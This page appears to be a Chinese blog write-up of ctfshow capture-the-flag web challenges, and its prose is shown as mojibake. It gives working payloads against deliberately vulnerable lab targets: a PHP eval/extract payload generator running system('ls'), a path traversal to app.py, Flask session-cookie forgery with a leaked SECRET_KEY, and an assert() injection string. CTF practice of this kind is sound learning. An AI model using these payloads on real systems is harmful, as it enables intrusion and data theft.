<!DOCTYPE html>


<html lang="zh-CN">
  

    <head>
      <meta charset="utf-8" />
        
      <meta name="description" content="æœ¬ç½‘ç«™æ˜¯ä¸ªäººå…´è¶£çˆ±å¥½ï¼Œæ€»ç»“åˆ†äº«ç»éªŒï¼Œè®°å½•ç”Ÿæ´»ç‚¹æ»´çš„å¹³å°ï¼Œå¸Œæœ›åœ¨ä»¥åçš„å­¦ä¹ æ—…é€”ä¸­ï¼Œèµ°å‡ºè‡ªå·±çš„é£æ™¯ã€‚" />
      
      <meta
        name="viewport"
        content="width=device-width, initial-scale=1, maximum-scale=1"
      />
      <title>ctfshow èœç‹—æ¯ |  n0rt6&#39;s bolg</title>
  <meta name="generator" content="hexo-theme-ayer">
      
      <link rel="shortcut icon" href="/favicon.jpg" />
       
<link rel="stylesheet" href="/dist/main.css">

      
<link rel="stylesheet" href="/css/fonts/remixicon.css">

      
<link rel="stylesheet" href="/css/custom.css">
 
      <script src="https://cdn.staticfile.org/pace/1.2.4/pace.min.js"></script>
       
 

      <link
        rel="stylesheet"
        href="https://cdn.jsdelivr.net/npm/@sweetalert2/theme-bulma@5.0.1/bulma.min.css"
      />
      <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11.0.19/dist/sweetalert2.min.js"></script>

      <!-- mermaid -->
      
      <style>
        .swal2-styled.swal2-confirm {
          font-size: 1.6rem;
        }
      </style>
    </head>
  </html>
</html>


<body>
  <!--æµè§ˆå™¨æç¬‘æ ‡é¢˜-->
<script type="text/javascript" src="\js\FunnyTitle.js"></script>
<!--ç‚¹å‡»çˆ±å¿ƒ-->
<script type="text/javascript" src="\js\clickLove.js"></script>
  <div id="app">
    
      
    <main class="content on">
      <section class="outer">
  <article
  id="post-ctfshow-èœç‹—æ¯"
  class="article article-type-post"
  itemscope
  itemprop="blogPost"
  data-scroll-reveal
>
  <div class="article-inner">
    
    <header class="article-header">
       
<h1 class="article-title sea-center" style="border-left:0" itemprop="name">
  ctfshow èœç‹—æ¯
</h1>
 

      
    </header>
     
    <div class="article-meta">
      <a href="/2023/02/27/ctfshow-%E8%8F%9C%E7%8B%97%E6%9D%AF/" class="article-date">
  <time datetime="2023-02-27T15:25:06.000Z" itemprop="datePublished">2023-02-27</time>
</a> 
  <div class="article-category">
    <a class="article-category-link" href="/categories/ctfshow/">ctfshow</a>
  </div>
  
<div class="word_count">
    <span class="post-time">
        <span class="post-meta-item-icon">
            <i class="ri-quill-pen-line"></i>
            <span class="post-meta-item-text"> å­—æ•°ç»Ÿè®¡:</span>
            <span class="post-count">2.7k</span>
        </span>
    </span>

    <span class="post-time">
        &nbsp; | &nbsp;
        <span class="post-meta-item-icon">
            <i class="ri-book-open-line"></i>
            <span class="post-meta-item-text"> é˜…è¯»æ—¶é•¿â‰ˆ</span>
            <span class="post-count">11 åˆ†é’Ÿ</span>
        </span>
    </span>
</div>
 
    </div>
      
    <div class="tocbot"></div>




  
    <div class="article-entry" itemprop="articleBody">
       
  <meta name="referrer" content="no-referrer"/>

<h2 id="æˆ‘çš„çœ¼é‡Œåªæœ‰"><a href="#æˆ‘çš„çœ¼é‡Œåªæœ‰" class="headerlink" title="æˆ‘çš„çœ¼é‡Œåªæœ‰$"></a>æˆ‘çš„çœ¼é‡Œåªæœ‰$</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>

<span class="token comment">/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2022-11-10 17:20:38
# @Last Modified by:   h1xa
# @Last Modified time: 2022-11-11 08:21:54
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/</span>


<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">extract</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$_</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>å‡å¦‚ä¼ å…¥_&#x3D;aï¼Œé‚£ä¹ˆå°±æ˜¯$<em>&#x3D;a;å†ä¼ å…¥a&#x3D;bï¼Œé‚£å°±æ˜¯$$</em>&#x3D;bï¼›</p>
<h3 id="extract-å®šä¹‰å’Œç”¨æ³•"><a href="#extract-å®šä¹‰å’Œç”¨æ³•" class="headerlink" title="extract()å®šä¹‰å’Œç”¨æ³•"></a>extract()å®šä¹‰å’Œç”¨æ³•</h3><p>extract() å‡½æ•°ä»æ•°ç»„ä¸­å°†å˜é‡å¯¼å…¥åˆ°å½“å‰çš„ç¬¦å·è¡¨ã€‚</p>
<p>è¯¥å‡½æ•°ä½¿ç”¨æ•°ç»„é”®åä½œä¸ºå˜é‡åï¼Œä½¿ç”¨æ•°ç»„é”®å€¼ä½œä¸ºå˜é‡å€¼ã€‚é’ˆå¯¹æ•°ç»„ä¸­çš„æ¯ä¸ªå…ƒç´ ï¼Œå°†åœ¨å½“å‰ç¬¦å·è¡¨ä¸­åˆ›å»ºå¯¹åº”çš„ä¸€ä¸ªå˜é‡ã€‚</p>
<p>ç¬¬äºŒä¸ªå‚æ•° type ç”¨äºæŒ‡å®šå½“æŸä¸ªå˜é‡å·²ç»å­˜åœ¨ï¼Œè€Œæ•°ç»„ä¸­åˆæœ‰åŒåå…ƒç´ æ—¶ï¼Œextract() å‡½æ•°å¦‚ä½•å¯¹å¾…è¿™æ ·çš„å†²çªã€‚</p>
<p>è¯¥å‡½æ•°è¿”å›æˆåŠŸå¯¼å…¥åˆ°ç¬¦å·è¡¨ä¸­çš„å˜é‡æ•°ç›®ã€‚</p>
<p>æ‰€ä»¥æˆ‘ä»¬è¦å¥—å¨ƒä¼ å…¥å˜é‡ï¼Œåº”è¯¥ä¼ å…¥36ä¸ªå˜é‡å†æ‰§è¡Œå‘½ä»¤ã€‚<br>è„šæœ¬ï¼š</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> string
s<span class="token operator">=</span>string<span class="token punctuation">.</span>ascii_letters
t<span class="token operator">=</span><span class="token string">'_=a&amp;'</span>
code<span class="token operator">=</span><span class="token string">"system('ls');"</span><span class="token comment">#è¦æ‰§è¡Œçš„å‘½ä»¤</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">35</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    t<span class="token operator">+=</span>s<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">+</span><span class="token string">'='</span><span class="token operator">+</span>s<span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token string">'&amp;'</span>

t<span class="token operator">+=</span>s<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">+</span><span class="token string">'='</span><span class="token operator">+</span>code
<span class="token keyword">print</span><span class="token punctuation">(</span>t<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<blockquote>
<p>_a&amp;a&#x3D;b&amp;b&#x3D;c&amp;c&#x3D;d&amp;d&#x3D;e&amp;e&#x3D;f&amp;f&#x3D;g&amp;g&#x3D;h&amp;h&#x3D;i&amp;i&#x3D;j&amp;j&#x3D;k&amp;k&#x3D;l&amp;l&#x3D;m&amp;m&#x3D;n&amp;n&#x3D;o&amp;o&#x3D;p&amp;p&#x3D;q&amp;q&#x3D;r&amp;r&#x3D;s&amp;s&#x3D;t&amp;t&#x3D;u&amp;u&#x3D;v&amp;v&#x3D;w&amp;w&#x3D;x&amp;x&#x3D;y&amp;y&#x3D;z&amp;z&#x3D;A&amp;A&#x3D;B&amp;B&#x3D;C&amp;C&#x3D;D&amp;D&#x3D;E&amp;E&#x3D;F&amp;F&#x3D;G&amp;G&#x3D;H&amp;H&#x3D;I&amp;I&#x3D;J&amp;I&#x3D;system(â€˜lsâ€™);</p>
</blockquote>
<p>å†å¯»æ‰¾flag<br>åŸæ¥åœ¨**cd ..&#x2F;..&#x2F;..&#x2F;**ä¸‹<br><img src="https://img-blog.csdnimg.cn/6741037228374d4f8e44c02254957c7a.png" alt="1"></p>
<h2 id="æŠ½è€å©†"><a href="#æŠ½è€å©†" class="headerlink" title="æŠ½è€å©†"></a>æŠ½è€å©†</h2><p><img src="https://img-blog.csdnimg.cn/c0f37ae3ffc04bc9bdcb011c5223db0f.png" alt="1"><strong>å­˜åœ¨ä»»æ„æ–‡ä»¶ä¸‹è½½</strong></p>
<p><img src="https://img-blog.csdnimg.cn/b2f80d87ab79442899aa7c1789dabc7c.png" alt="2"><br>è®¿é—®<strong><a target="_blank" rel="noopener" href="http://c5911a6c-20fd-4771-b630-967baf205874.challenge.ctf.show/download?file=1">http://c5911a6c-20fd-4771-b630-967baf205874.challenge.ctf.show/download?file=1</a></strong>æ—¶å‘ç°æŒ¨<strong>app.py</strong>å­˜åœ¨<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_45007073/article/details/113466902#:~:text=%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A%E4%BF%AE%E5%A4%8D%E6%96%B9%E6%A1%88%201%20%E5%9C%A8URL%E5%86%85%E4%B8%8D%E8%A6%81%E4%BD%BF%E7%94%A8%E6%96%87%E4%BB%B6%E5%90%8D%E7%A7%B0%E4%BD%9C%E4%B8%BA%E5%8F%82%E6%95%B0%202%20%E6%A3%80%E6%9F%A5%E4%BD%BF%E7%94%A8%E8%80%85%E8%BE%93%E5%85%A5%E7%9A%84%E6%96%87%E4%BB%B6%E5%90%8D%E6%98%AF%E5%90%A6%E6%9C%89%E2%80%9C%E2%80%A6%E2%80%9D%E7%9A%84%E7%9B%AE%E5%BD%95%E9%98%B6%E5%B1%82%E5%AD%97%E7%AC%A6%203,%E5%9C%A8php.ini%E6%96%87%E4%BB%B6%E4%B8%AD%E8%AE%BE%E7%BD%AEopen_basedir%E6%9D%A5%E6%8C%87%E5%AE%9A%E6%96%87%E4%BB%B6%E7%9A%84%E7%9B%AE%E5%BD%95%204%20%E4%BD%BF%E7%94%A8realpath%E5%87%BD%E6%95%B0%E6%9D%A5%E5%B1%95%E5%BC%80%E6%96%87%E4%BB%B6%E8%B7%AF%E5%BE%84%E4%B8%AD%E7%9A%84%E2%80%9C.%2F%E2%80%9D%E3%80%81%20%E2%80%9C%E2%80%A6%2F%E2%80%9D%E7%AD%89%E5%AD%97%E7%AC%A6%EF%BC%8C%E7%84%B6%E5%90%8E%E8%BF%94%E5%9B%9E%E7%BB%9D%E5%AF%B9%E8%B7%AF%E5%BE%84%E5%90%8D%E7%A7%B0%205%20%E4%BD%BF%E7%94%A8basename%E5%87%BD%E6%95%B0%E6%9D%A5%E8%BF%94%E5%9B%9E%E4%B8%8D%E5%8C%85%E5%90%AB%E8%B7%AF%E5%BE%84%E7%9A%84%E6%96%87%E4%BB%B6%E5%90%8D%E7%A7%B0">ç›®å½•ç©¿è¶Š</a>è®¿é—®<code>http://c5911a6c-20fd-4771-b630-967baf205874.challenge.ctf.show/download?file=../../app.py</code>å¾—åˆ°app.pyæ–‡ä»¶</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># !/usr/bin/env python</span>
<span class="token comment"># -*-coding:utf-8 -*-</span>

<span class="token triple-quoted-string string">"""
# File       : app.py
# Time       ï¼š2022/11/07 09:16
# Author     ï¼šg4_simon
# version    ï¼špython 3.9.7
# Descriptionï¼šæŠ½è€å©†ï¼Œå“‡å¶~
"""</span>

<span class="token keyword">from</span> flask <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token keyword">import</span> os
<span class="token keyword">import</span> random
<span class="token keyword">from</span> flag <span class="token keyword">import</span> flag

<span class="token comment">#åˆå§‹åŒ–å…¨å±€å˜é‡</span>
app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>
app<span class="token punctuation">.</span>config<span class="token punctuation">[</span><span class="token string">'SECRET_KEY'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'tanji_is_A_boy_Yooooooooooooooooooooo!'</span>

<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>  
    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'index.html'</span><span class="token punctuation">)</span>


<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/getwifi'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">getwifi</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    session<span class="token punctuation">[</span><span class="token string">'isadmin'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token boolean">False</span>
    wifi<span class="token operator">=</span>random<span class="token punctuation">.</span>choice<span class="token punctuation">(</span>os<span class="token punctuation">.</span>listdir<span class="token punctuation">(</span><span class="token string">'static/img'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    session<span class="token punctuation">[</span><span class="token string">'current_wifi'</span><span class="token punctuation">]</span><span class="token operator">=</span>wifi
    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'getwifi.html'</span><span class="token punctuation">,</span>wifi<span class="token operator">=</span>wifi<span class="token punctuation">)</span>



<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/download'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">source</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> 
    filename<span class="token operator">=</span>request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'file'</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> <span class="token string">'flag'</span> <span class="token keyword">in</span> filename<span class="token punctuation">:</span>
        <span class="token keyword">return</span> jsonify<span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token string">"msg"</span><span class="token punctuation">:</span><span class="token string">"ä½ æƒ³å¹²ä»€ä¹ˆï¼Ÿ"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> send_file<span class="token punctuation">(</span><span class="token string">'static/img/'</span><span class="token operator">+</span>filename<span class="token punctuation">,</span>as_attachment<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>


<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/secret_path_U_never_know'</span><span class="token punctuation">,</span>methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">getflag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> session<span class="token punctuation">[</span><span class="token string">'isadmin'</span><span class="token punctuation">]</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> jsonify<span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token string">"msg"</span><span class="token punctuation">:</span>flag<span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> jsonify<span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token string">"msg"</span><span class="token punctuation">:</span><span class="token string">"ä½ æ€ä¹ˆçŸ¥é“è¿™ä¸ªè·¯å¾„çš„ï¼Ÿä¸è¿‡è¿˜å¥½æˆ‘æœ‰èº«ä»½éªŒè¯"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>



<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span>port<span class="token operator">=</span><span class="token number">80</span><span class="token punctuation">,</span>debug<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>çœ‹å¤§ä½¬çš„wpåŸæ¥æ˜¯flaskçš„sessionè®¤è¯é¢˜ç›®ï¼Œéœ€è¦åœ¨ç”Ÿæˆä¸€ä¸ªcookieæ‰èƒ½å¾—åˆ°flagã€‚</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/secret_path_U_never_know'</span><span class="token punctuation">,</span>methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">getflag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> session<span class="token punctuation">[</span><span class="token string">'isadmin'</span><span class="token punctuation">]</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> jsonify<span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token string">"msg"</span><span class="token punctuation">:</span>flag<span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> jsonify<span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token string">"msg"</span><span class="token punctuation">:</span><span class="token string">"ä½ æ€ä¹ˆçŸ¥é“è¿™ä¸ªè·¯å¾„çš„ï¼Ÿä¸è¿‡è¿˜å¥½æˆ‘æœ‰èº«ä»½éªŒè¯"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>çœ‹åˆ°è¿™å¥æ‰¾åˆ°ä¸€ä¸ªè·¯å¾„</p>
<p><img src="https://img-blog.csdnimg.cn/57f0cfe9178e4930ad0c0a8885f3a123.png" alt="1"><br>è¿˜æœ‰èº«ä»½éªŒè¯ï¼Ÿçœ‹äº†ä»£ç å°±çŸ¥é“è¦sessionä¸­çš„isadminä¸ºçœŸã€‚é‡Œé¢ç­¾åè¦ç”¨åˆ°SECRET_KEYï¼›äºæ˜¯æˆ‘ä»¬å°†isadminçš„å€¼æ›´æ”¹åï¼Œä½¿ç”¨å¯†é’¥SECRET_KEYé‡æ–°åŠ å¯†ç”Ÿæˆä¸€ä¸ªsessionã€‚<br><a target="_blank" rel="noopener" href="https://github.com/noraj/flask-session-cookie-manager">githubå¼€æºè„šæœ¬</a>ï¼Œåœ¨kaliä¸­æ‰§è¡Œè„šæœ¬<br><img src="https://img-blog.csdnimg.cn/7eea38bdf10a46e58e10b3f7980efa98.png" alt="2"><br>å¾—åˆ°æ–°çš„sessionï¼Œç„¶åè®¿é—®<code>http://9bae1f73-6d1c-4258-a734-cf6bed842746.challenge.ctf.show/secret_path_U_never_know</code><br>ç”¨hackbaræ›´æ”¹cookieå¤´ï¼Œsessionæ”¹ä¸ºæ–°ç”Ÿæˆçš„ã€‚å¾—åˆ°flagã€‚</p>
<h2 id="ä¸€è¨€æ—¢å‡º"><a href="#ä¸€è¨€æ—¢å‡º" class="headerlink" title="ä¸€è¨€æ—¢å‡º"></a>ä¸€è¨€æ—¢å‡º</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
<span class="token keyword">include</span> <span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">;</span>  <span class="token comment">//å°†flag.phpæ–‡ä»¶åŒ…å«åœ¨å½“å‰è„šæœ¬ä¸­</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'num'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'num'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">114514</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token function">assert</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"intval(<span class="token interpolation"><span class="token variable">$_GET</span><span class="token punctuation">[</span>num<span class="token punctuation">]</span></span>)==1919810"</span><span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"ä¸€è¨€æ—¢å‡ºï¼Œé©·é©¬éš¾è¿½!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span> 
<span class="token punctuation">&#125;</span> 
</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>å¯ä»¥çœ‹åˆ°ï¼Œgetä¼ å…¥numï¼Œå…ˆåˆ¤æ–­numå€¼æ˜¯å¦ç­‰äº114514ï¼Œæ˜¯çš„è¯æ‰§è¡Œä¸‹é¢è¯­å¥ã€‚<br><code>assert(&quot;intval($_GET[num])==1919810&quot;) or die(&quot;ä¸€è¨€æ—¢å‡ºï¼Œé©·é©¬éš¾è¿½!&quot;);</code><br>æ­¤è¯­å¥å…ˆå°† GET è¯·æ±‚ä¸­çš„å‚æ•° num è½¬æ¢ä¸ºæ•´æ•°ï¼Œç„¶ååˆ¤æ–­æ˜¯å¦ç­‰äº 1919810ã€‚å¦‚æœç›¸ç­‰ï¼Œåˆ™ç»§ç»­æ‰§è¡Œä¸‹é¢çš„ä»£ç ï¼›å¦åˆ™ï¼Œè¾“å‡ºé”™è¯¯ä¿¡æ¯å¹¶ç»ˆæ­¢è„šæœ¬çš„æ‰§è¡Œã€‚<br><strong>é‚£ä¹ˆæˆ‘ä»¬å¯ä»¥æç»ˆæ­¢è„šæœ¬çš„æ‰§è¡Œ</strong>ï¼Œä¹Ÿå°±æ˜¯ä¼ å…¥<code>?num=114514);//</code>ç”±äºåœ¨phpä¸­æˆ‘ä»¬ä¼ å…¥çš„<code>114514);//</code>åªä¼šè¾¨åˆ«å‡ºå‰é¢çš„æ•°å­—<strong>114514</strong>å†æ‰§è¡Œ<strong>assert</strong>æ­¤æ—¶è¯­å¥æå‰é—­åˆï¼Œä¹Ÿå°±æ˜¯<code>assert(&quot;intval($_GET114514);//)==1919810&quot;) or die(&quot;ä¸€è¨€æ—¢å‡ºï¼Œé©·é©¬éš¾è¿½!&quot;);</code>åé¢è¢«æ³¨é‡Šæ‰äº†ç›´æ¥æ‰§è¡Œ<code>echo $flag;</code>å¾—åˆ°flagã€‚<br><img src="https://img-blog.csdnimg.cn/da7eab8fd3c44e4bb95ac6cf0a9cf4f3.png" alt="1"></p>
<blockquote>
<p>phpä¸­å…¶ä¸­ä¸¤ç§æ¯”è¾ƒç¬¦å·:<br>&#x3D;&#x3D;ï¼šå…ˆå°†å­—ç¬¦ä¸²ç±»å‹è½¬åŒ–æˆç›¸åŒï¼Œå†æ¯”è¾ƒ<br>&#x3D;&#x3D;&#x3D;ï¼šå…ˆåˆ¤æ–­ä¸¤ç§å­—ç¬¦ä¸²çš„ç±»å‹æ˜¯å¦ç›¸ç­‰ï¼Œå†æ¯”è¾ƒ<br>å­—ç¬¦ä¸²å’Œæ•°å­—æ¯”è¾ƒä½¿ç”¨&#x3D;&#x3D;æ—¶,å­—ç¬¦ä¸²ä¼šå…ˆè½¬æ¢ä¸ºæ•°å­—ç±»å‹å†æ¯”è¾ƒ<br>var_dump(â€˜aâ€™ &#x3D;&#x3D; 0);&#x2F;&#x2F;trueï¼Œæ­¤æ—¶aå­—ç¬¦ä¸²ç±»å‹è½¬åŒ–æˆæ•°å­—ï¼Œå› ä¸ºaå­—ç¬¦ä¸²å¼€å¤´ä¸­æ²¡æœ‰æ‰¾åˆ°æ•°å­—ï¼Œæ‰€ä»¥è½¬æ¢ä¸º0<br>var_dump(â€˜123aâ€™ &#x3D;&#x3D; 123);&#x2F;&#x2F;trueï¼Œè¿™é‡Œâ€™123aâ€™ä¼šè¢«è½¬æ¢ä¸º123<br>var_dump(â€˜a123â€™ &#x3D;&#x3D; 123);&#x2F;&#x2F;falseï¼Œå› ä¸ºphpä¸­æœ‰è¿™æ ·ä¸€ä¸ªè§„å®šï¼šå­—ç¬¦ä¸²çš„å¼€å§‹éƒ¨åˆ†å†³å®šäº†å®ƒçš„å€¼ï¼Œå¦‚æœè¯¥å­—ç¬¦ä¸²ä»¥åˆæ³•çš„æ•°å­—å¼€å§‹ï¼Œåˆ™ä½¿ç”¨è¯¥æ•°å­—è‡³å’Œå®ƒè¿ç»­çš„æœ€åä¸€ä¸ªæ•°å­—ç»“æŸï¼Œå¦åˆ™å…¶æ¯”è¾ƒæ—¶æ•´ä½“å€¼ä¸º0ã€‚</p>
</blockquote>
<p>è¿˜å¯ä»¥ä½¿ç”¨è¿ç®—æ³•<code>/?num=114514%2B1805296</code>åŠ å·è¢«urlç¼–ç **%2B**ä¹Ÿå¯å¾—åˆ°flagã€‚</p>
<h2 id="é©·é©¬éš¾è¿½"><a href="#é©·é©¬éš¾è¿½" class="headerlink" title="é©·é©¬éš¾è¿½"></a>é©·é©¬éš¾è¿½</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
<span class="token keyword">include</span> <span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">;</span>  
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'num'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
     <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'num'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">114514</span> <span class="token operator">&amp;&amp;</span> <span class="token function">check</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'num'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
              <span class="token function">assert</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"intval(<span class="token interpolation"><span class="token variable">$_GET</span><span class="token punctuation">[</span>num<span class="token punctuation">]</span></span>)==1919810"</span><span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"ä¸€è¨€æ—¢å‡ºï¼Œé©·é©¬éš¾è¿½!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
              <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>
     <span class="token punctuation">&#125;</span> 
<span class="token punctuation">&#125;</span> 

<span class="token keyword">function</span> <span class="token function-definition function">check</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
  <span class="token keyword">return</span> <span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/[a-z]|\;|\(|\)/"</span><span class="token punctuation">,</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<blockquote>
